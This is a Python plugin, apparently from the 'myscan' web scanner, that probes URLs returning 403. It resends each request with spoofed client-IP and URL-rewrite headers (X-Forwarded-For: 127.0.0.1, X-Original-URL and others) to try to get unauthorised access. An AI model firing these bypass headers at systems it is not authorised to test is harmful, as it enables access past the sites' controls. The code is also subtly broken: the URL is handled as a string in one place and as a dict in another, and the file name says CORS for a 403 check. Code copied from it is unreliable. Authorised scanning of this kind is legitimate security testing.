#!/usr/bin/env python3
# @Time    : 2020-02-17
# @Author  : caicai
# @File    : myscan_cors.py

import copy
from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.common import get_random_str
from myscan.lib.core.const import notAcceptedExt
from urllib.parse import urlparse


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "403 pass"
        self.vulmsg = "通过添加或修改请求头尝试绕过403进行未授权访问"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("response").get("status") != 403:
            return
        # 配置不当
        parser = dictdata_parser(self.dictdata)
        uri = urlparse(self.dictdata.get("url")).path
        req_headers = self.dictdata.get("request").get("headers")
        payload_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded": "127.0.0.1",
            "Forwarded-For": "127.0.0.1",
            "Forwarded": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-remote-IP": "127.0.0.1",
            "X-remote-addr": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": uri,
            "X-Rewrite-URL": uri,
            "Referer": self.dictdata.get("url"),
            "Ali-CDN-Real-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "Cdn-Src-Ip": "127.0.0.1",
            "Cdn-Real-Ip": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
            "X-Cluster-Client-IP": "127.0.0.1",
            "WL-Proxy-Client-IP": "127.0.0.1",
            "Proxy-Client-IP": "127.0.0.1",
            "Fastly-Client-Ip": "127.0.0.1"
        }
        for key in payload_headers:
            for key1 in req_headers:
                if key.lower() == key1.lower():
                    req_headers[key1] = payload_headers[key]
                else:
                    req_headers[key] = payload_headers[key]
        # 通过dictdata_parser对象构造一个新的请求
        req = parser.generaterequest({"headers": req_headers})
        r = request(**req)
        if r.status_code != 403:
            parser_resp = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.dictdata.get("url").get("url"),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "text": "通过添加或修改请求头从而绕过403",
                    "request": parser_resp.getrequestraw(),
                    "response": parser_resp.getresponseraw(),
                }
            })

